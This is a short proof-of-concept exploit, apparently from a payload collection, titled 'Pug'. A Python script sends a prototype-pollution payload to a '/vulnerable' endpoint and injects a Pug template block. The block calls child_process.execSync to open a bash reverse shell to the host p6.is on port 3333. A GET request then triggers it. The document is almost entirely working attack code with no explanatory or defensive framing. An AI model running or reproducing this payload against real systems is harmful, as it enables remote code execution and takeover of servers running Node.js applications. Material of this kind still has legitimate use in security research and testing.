# Pug

```
#py

import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
})

# execute
requests.get(TARGET_URL)


```
